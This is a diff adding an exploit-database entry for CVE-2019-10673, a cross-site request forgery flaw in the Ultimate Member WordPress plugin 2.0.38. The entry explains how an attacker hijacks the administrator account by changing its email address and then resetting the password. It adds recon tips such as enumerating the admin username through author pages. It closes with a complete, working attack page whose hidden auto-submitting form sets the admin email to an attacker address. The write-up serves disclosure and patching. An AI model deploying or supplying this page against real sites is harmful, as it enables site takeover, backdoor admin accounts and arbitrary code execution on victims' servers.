@@ -1,0 +1,111 @@
+id: 32458
+date: 04/01/2019
+title: WordPress Ultimate Member 2.0.38 Cross Site Request Forgery Vulnerability
+author: Georg Knabl
+cves: CVE-2019-10673
+
+# Exploit Title: WordPress Ultimate Member Plugin 2.0.38 CSRF
+# Discovered By: Georg Knabl
+# Vendor Website: https://ultimatemember.com/
+# Software Link: https://wordpress.org/plugins/ultimate-member/
+# Software Download URL : https://downloads.wordpress.org/plugin/ultimate-member.2.0.38.zip
+# Version: 2.0.38 (probably also 2.0.39 and older versions)
+# Fixed in Version: 2.0.40
+# CVE: CVE-2019-10673
+# Category : WebApps
+# CWEs: CWE-352
+
+********************************************************************************
+Vulnerability Description:
+
+A CSRF vulnerability in a logged-in user's profile edit form in
+the Ultimate Member plugin 2.0.38 for WordPress allows attackers to become admin and
+subsequently extract sensitive information and execute arbitrary code. This occurs because
+the attacker can change the e-mail address in
+the administrator profile, and then the attacker is able to reset
+the administrator password using the WordPress "password forget" form.
+
+********************************************************************************
+Software Description:
+
+The Ultimate Member plugin allows WordPress site owners to quickly implement a
+membership area. In this area, VIP users can view content that is hidden to other
+users. Additionally, the plugin provides functionality to edit the current logged-in
+member's profile information. At the time of discovery, the Ultimate Member plugin
+had more than 100.000 active installations.
+
+********************************************************************************
+Attack Vector:
+
+On the plugin page that allows members to edit their personal information, sensitive
+details such as the e-mail address can be changed by the logged-in user. The users
+managed by the plugin correspond to native WordPress users. Unfortunately, the
+plugin fails to secure against Cross Site Request Forgery (CSRF) attacks. This
+allows an attacker to prepare exploit code on another website and lure a logged-in
+administrator of the target website that uses the Ultimate Member plugin to this
+website. The website, then, sends a hidden POST request via a html form to the
+vulnerable website that causes the plugin to change the e-mail address of logged-in
+user to the e-mail address of the attacker. Now that the attacker's e-mail address
+is associated with an administrator role, the attacker is able to reset the password
+of the account using WordPress' "password forget" form. Subsequently the attacker
+is able to log-in with administrator access and cause further damage such as:
+
+* extract sensitive information (sensitive information disclosure)
+* upload and activate plugins or themes (arbitrary code execution)
+* edit files on the server using the built-in WordPress file editor (arbitrary
+code execution)
+* generate new admin user (backdoor)
+
+The administrator is not informed about this attack but might have problems logging
+in again as the password has changed. Even though the plugin sends a notification
+e-mail stating the profile data has changed, this message is sent to the new e-mail
+address, which now belongs to the attacker.
+
+Recon:
+An attacker may easily find out the presence of this plugin as it uses typical CSS
+class prefixes in the frontend. The target URL of the CSRF form can be guessed as
+it uses a default path. Alternatively, the attacker could request member access to
+determine the actual URL. The admin's username has to be known but could either
+be guessed or enumerated via WordPress' author pages assuming user ID equals to "1".
+Enumeration example call: https://vulnerable-website.example.com/?author=1
+
+********************************************************************************
+Exploit Code: (as placed on the third-party website that executes the CSRF. Tested
+on Google Chrome 73.)
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <script>
+            $(function(){
+                // set current timestamp
+                $('form input[name="timestamp"]').val(Math.floor(Date.now() / 1000) + 60 * 60);
+                // automatically submit form
+                $('form').submit();
+            });
+        </script>
+    </head>
+    <body>
+        ...arbitrary content...
+
+        <!-- hidden CSRF form --!>
+        <iframe style="display:none" name="csrf-frame"></iframe>
+        <form method="post" action="https://vulnerable-website.example.com/account/general/" target="csrf-frame" style="display:none">
+            <input type="hidden" name="_um_account" value="1" />
+            <input type="hidden" name="_um_account_tab" value="general" />
+            <input type="hidden" name="timestamp" value="1551799591" />
+            <input type="hidden" name="request" value="" />
+            <input type="hidden" name="user_login" value="administrator" /><!-- admin's username --!>
+            <input type="hidden" name="first_name" value="Foo" />
+            <input type="hidden" name="last_name" value="Bar" />
+            <input type="hidden" name="user_email" value="evil@attacker.com" /><!-- hacker's e-mail address --!>
+            <input type="hidden" name="um_account_submit" value="submit" />
+            <input type="hidden" name="current_user_password" value="" />
+            <input type="hidden" name="user_password" value="" />
+            <input type="hidden" name="confirm_user_password" value="" />
+        </form>
+    </body>
+</html>
+
+#  0day.today [2023-03-27]  #
